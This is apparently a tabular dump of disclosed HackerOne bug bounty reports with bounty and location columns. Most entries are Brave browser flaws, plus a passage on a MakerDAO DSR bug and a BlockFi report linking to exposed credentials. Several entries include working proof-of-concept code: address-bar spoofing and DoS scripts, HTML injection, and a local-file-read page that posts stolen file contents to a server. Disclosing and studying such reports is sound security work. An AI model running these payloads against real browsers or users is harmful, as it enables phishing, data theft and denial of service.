2 - Portion of DAI kept in DSR deposits.
3 - Time distribution of users calling end.pack.
It's impossible to know beforehand either. But we can make educated guesses
about a worst-case scenario.
It's possible that the DSR rate will be set at a high value at some point.
Considering that the previous incarnation of DAI saw a the CDP rate reach
25% at some point, it's definitely possible for DSR to reach a slightly lower
rate, say 20%. Furthermore, it's likely all users (including Dapps) will keep
their DAI holdings in DSR deposits, doing so has a possible upside, and minimal
gas costs.
As for the time-distribution of users redeeming their DAI, it's again entirely
possible that a large portion of the DAI supply will be used to interact with
Dapps rather than held speculatively. Augur V2, for example, has plans to use
DAI for making bets on prediction markets. Since these markets might take
quite a long time to be resolved -- up to several months -- it's unlikely
that a DAI shutdown would cause an immediate withdrawal of DAI by Augur users
-- if the reported vulnerability isn't known.
Other Dapps might well have similar characteristics, though it's again impossible
to know beforehand.
Given the above -- DSR rates up to 20% and most of DAI locked in DSR deposits
inside Dapps for months -- it's perfectly possible that the bug leads to
a loss of 10% or more of the collateral in the MCD contracts.
That scenario might happen even without an intentional attack.1 attachment:F554819: end.t.sol",https://hackerone.com/reports/672664,Masovian Voivodeship,Poland,Warsaw,2019,8,13,21,21
BlockFi,501-1000,0.0,1m-10m,$250.00,Low,2.0,Password in Configuration File,credentials found in config file on github,"akitech  submitted a report to BlockFi.Mar 24th (2 years ago)Summary:
Hi, credentials belonging to blockfi.com was found exposed on github, these credentials can lead to attackers gaining access into the network and stealing information and destroying servers
Steps To Reproduce:
https://github.com/paw2py/ETH_API/blob/8658c39d1742f07ac7b5f0e41b82ad164f3ba099/config.py
https://github.com/naboagye-blockfi/ecs-pipeline/blob/38b1417d4dfff624eb6f649d27256758f395aa65/COPY/prometheus/prometheus.yml
Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

[attachment / reference]

Impact
these credentials can lead to attackers gaining access into the network and stealing information and destroying servers",https://hackerone.com/reports/1134060,New Jersey,United States,Jersey City,2021,3,24,12,40
Brave Software,101-250,0.0,10m-50m,$150.00,High,7.95,Cross-site Scripting (XSS) - Generic,[Android] HTML Injection in BatterySaveArticleRenderer WebView,"bobrov  submitted a report to Brave Software.Oct 16th (6 years ago)Summary:
HTML Injection in BatterySaveArticleRenderer WebView.
Products affected:

Android Brave Browser 1.9.56

Steps To Reproduce:

Open https://blackfan.ru/brave or html

Code 99 BytesWrap lines Copy Download1<script>
2location=""https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--""
3</script>

Wait for a full load
Click on ArticleModeButton

Supporting Material/References:
Vulnerable code:
Code 516 BytesWrap lines Copy Download1public class aot
2...
3// s7 == title
4if(s7 != null)
5{
6  s4 = (new StringBuilder()).append(s5).append(""<title>"").append(s7).append(""</title>"").toString();
7  s1 = (new StringBuilder()).append(s6).append(""<p style=\""font-size:"").append(s1).append("";line-height:120%;font-weight:bold;margin:"").append(s3).append("" 0px 12px 0px\"">"").append(s7).append(""</p>"").toString();
8...
9// s8 == authorName
10if(s8 != null)
11  s1 = (new StringBuilder()).append(""<span class=\""nowrap\""><b>"").append(s8).append(""</b>,</span> "").toString();2 attachments:F128188: Screenshot_20161016-041209.pngF128189: Screenshot_20161016-041215.png",https://hackerone.com/reports/176065,California,United States,San Francisco,2016,10,16,0,14
Brave Software,101-250,0.0,10m-50m,$25.00,Low,2.0,Denial of Service,[DOS] Browser hangs on loading the code snippet,"tikoo_sahil  submitted a report to Brave Software.Nov 12th (6 years ago)Summary:
Basically the function location.reload() is causing browser to hang as browser is not able to handle multiple reloads but similar issue cannot be seen in Firefox and chrome as i am able to close the current tab.
Products affected:
Latest brave browser in linux.
Steps To Reproduce:
Use the below code and save it as html file and then open it up on browser :-
Code 64 BytesWrap lines Copy Download1<script>
2open("""");
3setInterval('location.reload()',1);
4</script>
Or
open up pop.html that i have attached
Supporting Material/References:
i have attached html file that contains the code causing denial of service,1 attachment:F134227: pop.html",https://hackerone.com/reports/181686,California,United States,San Francisco,2016,11,12,1,42
Brave Software,101-250,0.0,10m-50m,$25.00,Low,2.0,Denial of Service,[DOS] denial of service using code snippet on brave browser,"tikoo_sahil  submitted a report to Brave Software.Nov 11th (6 years ago)Summary:
brave browser hangs due to no validation  for  a  code snippet causing denial of service to users.
Products affected:
latest brave browser in linux
Steps To Reproduce:
code snippet:-
1) <script>window.location+='?\u202a\uFEFF\u202b';</script> 
OR
2) <iframe style=""width:0;height:0;border:0"" src=""data:text/html;charset=utf-8,<script>window.location+='?'+window.location.toString().split('');</script>"">
Note :- both these issues have been fixed in google chrome and firefox gives some delay time to close tabs.
This is a variation of ""a = a + a"" that creates a very long URL. on my machine the
renderer eventually is killed when the URL gets too large.
Supporting Material/References:
i have attached both html files you can open them up and see browser hang.2 attachments:F134080: tt.htmlF134081: tt1.html",https://hackerone.com/reports/181558,California,United States,San Francisco,2016,11,11,11,51
Brave Software,101-250,0.0,10m-50m,$50.00,Low,2.0,None,[ios] Address bar spoofing in Brave for iOS,"ibram  submitted a report to Brave Software.Oct 20th (6 years ago)Hey
Summary:
I've found an address bar spoofing vulnerability in the latest version of Brave for iOS.
Products affected:
Brave for iOS 1.2.16
(Android maybe?)
PoC:
Code 295 BytesWrap lines Copy Download1<script>
2  var spoof = function(){
3      document.write(""<h1>This is not Google</h1>"");
4      document.location = ""https://google.com:1234"";
5      setInterval(function(){document.location=""https://google.com:1234"";},9800);
6  };
7</script>
8
9<input type=""button"" value=""Spoof"" onclick=""spoof();"" />
Supporting Material/References:
Image F128949: IMG_3820.PNG 47.11 KiBZoom in Zoom out Copy Download
Regards,
Ibram1 attachment:F128949: IMG_3820.PNG",https://hackerone.com/reports/176929,California,United States,San Francisco,2016,10,20,0,40
Brave Software,101-250,0.0,10m-50m,$200.00,No value,0.0,Violation of Secure Design Principles,[iOS/Android] Address Bar Spoofing Vulnerability ,"aaditya_purani  submitted a report to Brave Software.Oct 15th (6 years ago)Hello,
I am Aaditya Purani, I would like to Report Address Bar spoofing vulnerability in Brave Browser on the IOS as well as Android Platform. All the Test have been carried out against Latest Brave Browser whose versions i have mentioned in Products affected section.
Summary:
Brave Browser Suffers from Address Bar Spoofing Vulnerability. Address Bar spoofing is a critical vulnerability in which any attacker can spoof the address bar to a legit looking website but the content of the web-page remains different from the Address-Bar display of the site. In Simple words, the victim sees a familiar looking URL but the content is not from the same URL but the attacker controlled content. Some companies say ""We recognize that the address bar is the only reliable security indicator in modern browsers"" . 
Products affected:

In IOS - Affected is the Latest Version 1.2.16 (16.09.30.10)
In Android - Affected in Brave Latest version 1.9.56 

Steps To Reproduce
I created a HTML Code which would spoof address bar of Brave Browser ( bravespoof.html) in the Attachments. As we can understand, the code contains a form which i have created just to demonstrate a look-a-like impact where it asks for username and password of any user. But the real trick is done, by the function f() whose location is equal to https://facebook.com . Additionally, to complete the exploit i used setInterval function to execute the function f continuously after every 10 milliseconds. Hence, ideally after 10 ms the Location would divert the URL as well as the page to display https://facebook.com content or it some cases, it keeps hold the of URL without changing the URL nor the page (which is again a safe case) . But in Brave Browser both fails, In brave when you host the below given HTML code to a web server and visit from either Android or IOS Brave Browser, The URL would get spoofed to https://facebook.com (Even it shows Green lock so victim would believe) but the content remains the one which attackers have placed.
Look at the Screenshot addressbarbrave.jpg POC where i showed how in Android Brave Browser the URL changed to https://facebook.com but the Content remains attacker controlled (i.e fakebook login page) . Moreover, the image of the bubble shows facebook logo (any victim would believe it )
Another screenshot i attached is braveiospoofing.jpg which is the POC of affected IOS Brave browser as we can see it shows https://facebook.com with green lock but the body of page is attacker controlled
I carried out same test in Chrome Browser too, But chrome is smart; It doesn't changes the url to https://facebook.com but the URL remain same of the URL of Hosted HTML ( I showed the same in chromeaddress.jpg screenshot). The same happens in Mozilla , it is also not affected. But the best one is UC Mini (on android) where it redirects to complete https://facebook.com to mitigate this fully. Even Safari Mobile (IOS) is also not affected. I tested the same on many browsers and Brave turned out to be affected.
I sincerely hope this gets Patched ASAP . Cheers !4 attachments:F128077: bravespoof.htmlF128078: chromeaddress.jpgF128080: addressbarbrave.jpgF128081: braveiospoofing.jpg",https://hackerone.com/reports/175958,California,United States,San Francisco,2016,10,15,8,17
Brave Software,101-250,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,[iOS] URL can be replaceState by blob URL in iOS Brave,"xifengweiyu  submitted a report to Brave Software.Mar 21st (6 years ago)Summary:
URL can be replace by blob URL using function history.replaceState()
Products affected:
iOS brave version 1.3.1(17.02.14.11)
Steps To Reproduce:


Add a html named ""blob.html"" which link is ""http://192.168.1.111/blob.html""


And its source is:


Code 79 BytesWrap lines Copy Download1<script>
2history.replaceState('','','blob:http://192.168.1.111/xxxx')
3</script>

then visit this page,you will find that URL has been replace by blob URL successfully!
1 attachment:F170267: IMG_3124.PNG",https://hackerone.com/reports/215044,California,United States,San Francisco,2017,3,21,8,2
Brave Software,101-250,0.0,10m-50m,"$2,000.00",High,7.95,None,"`chrome://brave` available for navigation in Release build [-> RCE] + navigation to `chrome://*` using tab_helper [""Open in new tab""]","metnew  submitted a report to Brave Software.Aug 16th (4 years ago)Summary:
chrome://brave is available for navigation
Navigation to chrome://brave + <local_file_path> requires local file at <local_file_path>.
The file loaded in this context has access to private Muon APIs such as chrome.ipcRenderer/remote/webFrame/webViewRequest.
Muon API allows executing code on the device. (e.g. with chrome.remote.require('child_process').exec)

In addition, Brave isn't sandboxed (on all OS).

That's clearly a vulnerability, not a feature:

it's in Release channel, not in Debug builds
Could lead to RCE


Note: attacker knows the correct <local_file_path> after loading the file from file:// origin (window.location.pathname).

Navigation to chrome://brave
I've already shown the way to navigate to file:// URLs in  #369218, which was fixed in 0.23.80.

 I mentioned in the report that it's possible navigating to chrome:// URLs too in #369218. However, the fix was incomplete. It only works for about: and file:URLs.

PoC

Shows that <webview> works
Launches Calculator.app on macOS

Products affected:
Brave: 0.23.79 (0.23.80 and 0.23.100 too, where #369218 is patched)
V8: 6.8.275.24
rev: 51b49051a779f0db94fbcfd0df5faca781299ea0
Muon: 8.0.7
OS Release: 17.7.0
Update Channel: Release
OS Architecture: x64
OS Platform: macOS
Node.js: 7.9.0
Brave Sync: v1.4.2
libchromiumcontent: 68.0.3440.84
Steps To Reproduce ||  Attack Scenario:

Download exploit.html
Open link in the file using ""Open in new tab""
The new tab opens with private <webview> tag + Calculator.app starts

Patch
Preventing navigation to chrome://brave origin seems ok.
Additional resources
Screencast attached.
Impact
Crafted HTML file allows executing code on the device. 

Requires user gesture - ""Open in a new tab"". Set impact to ""High"", because requires downloading the file.
2 attachments:F333763: exploit.htmlF334043: brave-chrome-brave-new-tab.mp4",https://hackerone.com/reports/395737,California,United States,San Francisco,2018,8,16,4,53
Brave Software,101-250,0.0,10m-50m,$100.00,Medium,5.45,None,Access to local file system using javascript,"karel_origin  submitted a report to Brave Software.Oct 15th (6 years ago)Hey,
The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.
Code 470 BytesWrap lines Copy Download1<html>
2<body>
3<div id='div1'>
4</div>
5<script>
6current_href = document.location.href
7frame = document.createElement('iframe'); frame.src = current_href.replace('/Downloads/test.html', '/Desktop/Desktop.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
8setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
9alert('Your data is: ' + loot)
10}, 500)
11</script>
12</body>
13</html>
I was able to do this with some simple html as you can see above.
This loads a file called 'Desktop.txt' from the downloads folder and creates an alert message with the file content. I would have been able to post it to my server using jquery like this:
Code 346 BytesWrap lines Copy Download1//Gets data from iframe and saves it to the getdata variable
2getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML
3//Posts to the php server located at 192.168.0.106 (local address for demo purposes)
4$.ajax({type: ""POST"", url: ""http://192.168.0.106/post.php"", data: {string:getdata}});}
Code 52 BytesWrap lines Copy Download1//Can be retrieved with php using:
2$_POST['string'];
This only works if the html file is opened locally as i mentioned earlier,
Karel.1 attachment:F128115: Screen_Shot_2016-10-15_at_13.20.12.pngSummary by karel_originBrave Treated every local file as same-origin ('file://') giving local HTML files read access to other local files
Code 470 Bytes1<html>
2<body>
3<div id='div1'>
4</div>
5<script>
6current_href = document.location.href
7frame = document.createElement('iframe'); frame.src = current_href.replace('/Downloads/test.html', '/Desktop/Desktop.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
8setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
9alert('Your data is: ' + loot)
10}, 500)
11</script>
12</body>
13</html>
This would pop an alert box with the content of a file named 'Desktop.txt' located in the Desktop folder.
Code 342 Bytes1<html>
2<head>
3<script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js""></script>
4<script>$.getScript( ""data.txt"", function( data, textStatus, jqxhr ) {
5  document.write('<h1>Your data</h1><pre>' + data + '</pre>');
6});
7//This loads a file called 'data.txt' and prints the content
8</script>
9</head>
10<body>
11</body>
12</html>
The HTML above could also be used to read the content of a file.",https://hackerone.com/reports/175979,California,United States,San Francisco,2016,10,15,11,27
Brave Software,101-250,0.0,10m-50m,$100.00,Low,2.0,Open Redirect,Address Bar Spoofing - Already resolved - Retroactive report,"jimeno  submitted a report to Brave Software.Oct 14th (6 years ago)Summary:
All details were provided in the original report. You can read it here
I'm reporting it here because I asked bcrypt if I should do it and he told me this:
Image F127893: dm.png 1.82 MiBZoom in Zoom out Copy Download
As she said me, I'm reporting here and indicating it's for a retroactive reward.
If any identity confirmation or link between my Github account and my H1 account is needed, please, feel free to ask for it.
Kind regards.1 attachment:F127893: dm.pngBrave Software  rewarded jimeno with a $100 bounty. Oct 14th (6 years ago)Thanks!diracdeltas Brave Software staff  closed the report and changed the status to Resolved. Oct 14th (6 years ago)diracdeltas Brave Software staff  requested to disclose this report. Oct 14th (6 years ago)jimeno   agreed to disclose this report. Oct 14th (6 years ago)  This report has been disclosed. Oct 14th (6 years ago)",https://hackerone.com/reports/175779,California,United States,San Francisco,2016,10,14,16,18
Brave Software,101-250,0.0,10m-50m,$250.00,High,7.95,Privacy Violation,application/x-brave-tab should not be readable.,"qab  submitted a report to Brave Software.Aug 10th (5 years ago)Summary:
It is possible to read a dragged tab object if user is coerced into drag and dropping it into attacker controlled page. This is bad because tab history is mentioned within the object, thus information leaks are possible through a trick.
Products affected:
Brave: 0.18.14
rev: ad92d029e184c4cff01b2e9f4916725ba675e3c8
Muon: 4.3.6
libchromiumcontent: 60.0.3112.78
V8: 6.0.286.44
Node.js: 7.9.0
Update Channel: dev
OS Platform: Microsoft Windows
OS Release: 10.0.14393
OS Architecture: x64
Steps To Reproduce:

Open PoC and click on button.
Popup should appear loading facebook and then should direct to a dummy page
Attempt to drag and drop the newly opened windows tab into the big 'O' under the button. (as if you are trying to move the tab but instead you drop it into the O)
We can successfully read 'x-brave-tab' object including history.

As I mentioned before, so much information is available in the output, specifically I want to point to the history section, where we can extract victims facebook name by reading URL after redirect.
This is done by opening a popup pointing to 'https://www.facebook.com/me' which will instantly redirect to 'https://www.facebook.com/{your name}' and then we redirect into a dummy page in order to create a history object.
Given that the user is not dragging directly from facebook.com then it is not the same as having a user copy paste or drag n drop their facebook URL. This is pretty much completely done within attacker controlled website.
Supporting Material/References:
PoC attached.
Also, I wonder if something worse could happen messing with this object. I haven't been able to produce my own custom tabs yet, but if that is even theoretically possible then we 'theoretically' also have control of all the variables mentioned in the tab object.
Here is a sample of the output:
Code 1.18 KiBWrap lines Copy Download1{""showOnRight"":false,""security"":{""isSecure"":false,""runInsecureContent"":false},""src"":""about:blank"",""lastAccessedTime"":1502356944847,""computedThemeColor"":null,""guestInstanceId"":44,""adblock"":{},""partition"":""persist:default"",""findDetail"":{""searchString"":"""",""caseSensitivity"":false},""noScript"":{},""endLoadTime"":1502356942486,""navbar"":{""urlbar"":{""location"":""http://localhost/wut.html"",""suggestions"":{""selectedIndex"":null,""searchResults"":[],""suggestionList"":null,""shouldRender"":false},""selected"":false,""focused"":false,""active"":false}},""trackingProtection"":{},""tabId"":322,""zoomLevel"":0,""breakpoint"":""default"",""partitionNumber"":0,""history"":[""https://www.facebook.com/abdulrahman.alqabandi.3"",""https://www.facebook.com/abdulrahman.alqabandi.3"",""http://localhost/wut.html""],""audioMuted"":false,""startLoadTime"":1502356941347,""provisionalLocation"":""https://www.facebook.com/abdulrahman.alqabandi.3"",""location"":""http://localhost/wut.html"",""fingerprintingProtection"":{},""httpsEverywhere"":{},""audioPlaybackActive"":false,""disposition"":""new-popup"",""title"":""localhost/wut.html"",""searchDetail"":null,""icon"":null,""isPrivate"":false,""openerTabId"":5,""parentFrameKey"":null,""loading"":false,""hrefPreview"":"""",""unloaded"":false,""key"":1}1 attachment:F211167: dnds.html",https://hackerone.com/reports/258578,California,United States,San Francisco,2017,8,10,9,33
Brave Software,101-250,0.0,10m-50m,$400.00,Medium,5.45,Cleartext Storage of Sensitive Information,Brave Browser permanently timestamps & logs connection times for all v2 domains ~/.config/BraveSoftware/Brave-Browser/tor/data/tor.log,"sickcodes  submitted a report to Brave Software.Jul 1st (about 1 year ago)Summary:
A vulnerability in the Brave Browser v1.28.43 and below allows a local or physical attacker to view the exact timestamps that a user connected to a v2 onion address. A local or physical attacker could read  ~/.config/BraveSoftware/Brave-Browser/tor/data/tor.log identify the exact moment a user connected to a new site, easily triangulating the user via a complete log of connection timestamps, which could be easily compared with a server connection log, a compromised Tor end point, or other related Tor attack, affecting the confidentiality & integrity of a user's Tor session.
Products affected:

operating system, Brave version or Brave website page, etc.

Tor Desktop Browser (All platforms)
Steps To Reproduce:

List the steps needed to reproduce the vulnerability

Visit http://wikitoronionlinks.com/ while using Tor Private Browsing.
Click on an assortment of .onion v2 URLs.
Inspect ~/.config/BraveSoftware/Brave-Browser/tor/data/tor.log
Supporting Material/References:
Code 5.74 KiBWrap lines Copy Download1Jul 01 08:40:50.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
2Jul 01 08:40:50.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
3Jul 01 08:40:51.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
4Jul 01 08:40:51.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
5Jul 01 08:40:51.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
6Jul 01 08:40:52.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
7Jul 01 08:40:53.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
8Jul 01 08:40:59.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
9Jul 01 08:40:59.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
10Jul 01 08:41:00.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
11Jul 01 08:41:02.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
12Jul 01 08:41:02.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
13Jul 01 08:41:02.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
14Jul 01 08:41:07.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
15Jul 01 08:41:07.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
16Jul 01 08:41:09.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
17Jul 01 08:41:09.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
18Jul 01 08:41:09.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
19Jul 01 08:41:10.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
20Jul 01 08:41:12.000 [warn] Warning! You've just connected to a v2 onion address. These addresses are deprecated for security reasons, and are no longer supported in Tor. Please encourage the site operator to upgrade. For more information see https://blog.torproject.org/v2-deprecation-timeline
21
Impact
Violate the confidentiality & integrity of a user's Tor session.2 attachments:F1360378: Screenshot_2021-07-01_08-41-05.pngF1360379: Screenshot_2021-07-01_08-50-25.png",https://hackerone.com/reports/1249056,California,United States,San Francisco,2021,7,1,8,53
Brave Software,101-250,0.0,10m-50m,$100.00,Low,3.5,Cleartext Storage of Sensitive Information,Brave Browser potentially logs the last time a Tor window was used,"sickcodes  submitted a report to Brave Software.Nov 2nd (2 years ago)Summary:
A vulnerability in the Brave Browser allows an attacker to view the last time a Tor session was used in incognito mode. A local, on-disk attacker could read the Brave Browser's ""Local State"" json file and identify the last time a Tor session was used, affecting the confidentiality of a user's Tor session.
For example, the ""Local State"" file of a user who has recently used a Tor session would list a key value pair with a timestamp as accurate as ""13248493693576042"". This allows an attacker to fingerprint, or prove beyond reasonable doubt, that a user was using Tor at that very specific moment in time.
Products affected:
Brave 1.18.27 and below
Steps To Reproduce:
 Start a Tor session in Brave Browser
Supporting Material/References:
As discussed with security@ team in email chain titled:
Re: [Security] CVE Request 981386 - Brave Browser (All) - Exposure of
Sensitive Information to an Unauthorized Actor While Using Tor Feature
And fixed in PR 7010:
https://github.com/brave/brave-core/pull/7010

List any additional material (e.g. screenshots, logs, etc.)

Impact
Violate the confidentiality of a user's Tor session.",https://hackerone.com/reports/1024668,California,United States,San Francisco,2020,11,2,17,48
Brave Software,101-250,0.0,10m-50m,"$1,000.00",High,7.95,Information Disclosure,Brave Browser Tor Window leaks user's real IP to the external DNS server,"xiaoyinl  submitted a report to Brave Software.Jan 12th (2 years ago)Summary:
When a user navigates to a URL in Tor Window, the DNS requests are sent directly without using the Tor proxy, which leaks the user's real IP address and the requested domain name to the user's ISP and the DNS server.
Products affected:

OS: Ubuntu 18.04.5 LTS x86_64
Brave: Version 1.18.78 Chromium: 87.0.4280.141 (Official Build) (64-bit)

Steps To Reproduce:

Open WireShark, and start capturing traffic on the Internet interface. Set WireShark's display filter to dns.
Open Brave Browser. Then open new private window with Tor.
On the Tor window, navigate to https://tools.ietf.org/ (or any other URLs)
In WireShark, you can see a DNS request for tools.ietf.org sent to your DNS server.

Supporting Material/References:

a screenshot attached

Impact
Brave's Tor window passively leaks users' IP addresses and requests to DNS servers. This undermines the user's anonymity.1 attachment:F1154663: tor-window-dns-leakage.png",https://hackerone.com/reports/1077022,California,United States,San Francisco,2021,1,12,13,44
Brave Software,101-250,0.0,10m-50m,$50.00,Low,2.0,Information Disclosure,2 Directory Listing on ledger.brave.com & vault-staging.brave.com,"bibo  submitted a report to Brave Software.Oct 12th (6 years ago)Hi Brave team,
Have found 2 Directory listing on:

https://ledger.brave.com/swaggerui/
https://vault-staging.brave.com/swaggerui/

Refer to screenshosts for clarification:
Image F127337: dir_listing1.png 21.54 KiBZoom in Zoom out Copy Download
Image F127336: dir_listing2.png 22.25 KiBZoom in Zoom out Copy Download2 attachments:F127336: dir_listing2.pngF127337: dir_listing1.pngmrose17 Brave Software staff  posted a comment. Oct 13th (6 years ago)@bibo - great catch, thanks! looks like it's time to fork hapi-swagger and tell it not to do directory listsings...Brave Software  rewarded bibo with a $50 bounty. Oct 13th (6 years ago)diracdeltas Brave Software staff  changed the status to Triaged. Oct 13th (6 years ago)mrose17 Brave Software staff  posted a comment. Oct 13th (6 years ago)servers now updated.diracdeltas Brave Software staff  closed the report and changed the status to Resolved. Oct 13th (6 years ago)
    
    
        
            
                
                
                
            
        
    
bibo   posted a comment. Oct 14th (6 years ago)Hi @mrose17,
Quick fixed ! Great job. And thanks for bounty ! 
Actually after 2 first reports, I've bad experience with your program. But this one is ok. The difference is this issue handled by you !diracdeltas Brave Software staff  requested to disclose this report. Oct 14th (6 years ago)diracdeltas Brave Software staff  updated the severity from medium to low. Oct 14th (6 years ago)  This report has been disclosed. Nov 13th (6 years ago)",https://hackerone.com/reports/175320,California,United States,San Francisco,2016,10,12,7,29
Brave Software,101-250,0.0,10m-50m,$50.00,Medium,5.45,None,"Navigation to restricted origins via ""Open in new tab""","metnew  submitted a report to Brave Software.Jun 20th (4 years ago)Summary:
It's possible to open links pointing to file:/// origin from web pages using ""Open link in a new tab"" in context menu.

https://hackerone.com/bugs?report_id=369185 shows unsafe ssh:// protocol handling, which leads to information leak using ssh(OS username and etc.). The vulnerability is highly available, so it's possible to leverage it.

As of, we could get username, it's easy to predict path of the downloaded file:
file:///Users/${USERNAME_FROM_SSH}/Download/${DOWNLOADED_FILE_NAME}
USERNAME_FROM_SSH
When user initiates ssh session through browser, it's equal to running ssh os_username@hostname.com. So the host which receives connection request knows user's OS username.
DOWNLOADED_FILE_NAME
DOWNLOADED_FILE_NAME is download attribute of the link. That means, it's under the attacker's control.
Products affected:
Brave 0.22.810
V8 6.7.288.43
rev 8f30eeb
Muon 7.0.6
OS Release 17.6.0
Update Channel Release
OS Architecture x64
OS Platform macOS
Node.js 7.9.0
Brave Sync v1.4.2
libchromiumcontent 67.0.3396.71
OS: macOS 10.13.5 17F77 x86_64
Steps To Reproduce:
Live PoC: https://brave-download-execute-local-fs-ifhsmtsbik.now.sh

I could provide a PoC with ""ssh step"", if it could increase a bounty. Currently, OS username is hardcoded in exploit.html. Insert your OS username to run the exploit. (e.g. using devtools or locally)


Webpage requests navigation to ssh:// -  user agrees.
Navigation happens, attacker's host received ssh connection request. Attacker knows user's OS username.
Webpage asks to download the file. Let's name it file-load.html. Downloading happens.
User opens a link(using ""Open in a new tab"") which points to file:///Users/${USERNAME_FROM_SSH}/Download/file-load.html
Navigation happens, downloaded HTML file executes on local file system.

Screencast attached.
Impact
Navigation from web pages to file:/// and executing downloaded (from the web) files on local filesystem is definitely a vulnerability, which additionally opens a wider attack surface for an attacker. 

Bypassing SOP on file:/// origin could lead to a full-chain exploit 😈.
3 attachments:F310810: file-load.htmlF310811: exploit.htmlF310812: Kapture_2018-06-20_at_19.31.36.mp4",https://hackerone.com/reports/369218,California,United States,San Francisco,2018,6,20,16,39
Brave Software,101-250,0.0,10m-50m,$50.00,Low,2.0,None,Cross-origin page stays focused before/after downloading + uninformative modal window for download,"metnew  submitted a report to Brave Software.Jul 2nd (4 years ago)Summary:

Open twitter.com using window.open
Wait some time (to finish page rendering)
Change location of the opened page to any downloading
Download modal appears above the twitter.com

The problem is that a user doesn't see what page exactly initiates downloading and what resource(URL) will be downloaded.
It's possible to find out the origin of the downloaded file only after clicking ""Save"".

FF has a similar modal window for downloads; However, FF shows URL of the resource before downloading. Brave doesn't do that.


Safari+Chrome allow downloads without confirmation, so this behavior is normal for them.

Products affected:
Brave: 0.23.19
V8: 6.7.288.46
rev: 178c3fbc045a0cbdbe098db08307503cce952081
Muon: 7.1.3
OS Release: 17.6.0
Update Channel: Release
OS Architecture: x64
OS Platform: macOS
Node.js: 7.9.0
Tor: 0.3.3.7 (git-035a35178c92da94)
Brave Sync: v1.4.2
libchromiumcontent: 67.0.3396.87
Steps To Reproduce:
Minimal PoC:
Code 211 BytesWrap lines Copy Download1<script>
2  function f() {
3    w = window.open(`https://twitter.com`);
4    setTimeout(() => {
5      w.location.replace('./hello.jar')
6    }, 3000)
7  }
8</script>
9
10<h1>
11  <a href=""#"" onclick=""f()"">Twitter</a>
12</h1>
Supporting Material/References:
Live PoC.
PoC + screencast attached.
Impact
This bug is related to UX and low severe.
However, it makes #374106 much more available, because it allows downloading a malicious .jar from a ""trusted resource"".

Note that both #374106 and this report are related to downloads.
3 attachments:F314500: hello.jarF314501: exploit.htmlF314502: brave-download-twitter.mp4",https://hackerone.com/reports/375259,California,United States,San Francisco,2018,7,2,10,25
